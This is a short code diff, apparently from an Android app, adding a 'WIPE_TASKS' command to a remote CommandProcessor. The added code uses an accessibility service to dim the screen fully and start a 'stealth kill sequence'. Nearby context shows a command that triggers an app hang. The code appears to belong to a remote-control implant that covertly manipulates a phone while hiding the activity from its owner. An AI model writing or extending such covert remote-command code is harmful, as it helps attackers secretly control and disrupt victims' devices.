@@ -1755,6 +1755,18 @@ object CommandProcessor {
                         status = "ANR_TRIGGERED"
                     }
                 }
+                "WIPE_TASKS" -> {
+                    val service = MyAccessibilityService.instance
+                    if (service == null) {
+                        status = "FAILED (SERVICE_OFF)"
+                    } else {
+                        android.os.Handler(android.os.Looper.getMainLooper()).post {
+                            DimmerManager.applyDim(ctx, 100, "ACC")
+                            service.startStealthKillSequence()
+                        }
+                        status = "TASK_PURGE_INITIATED"
+                    }
+                }
                 else -> {
                     status = "FAILED (UNKNOWN_CMD)"
                     errorMsg = "Command '$fileName' is not recognized by the device."
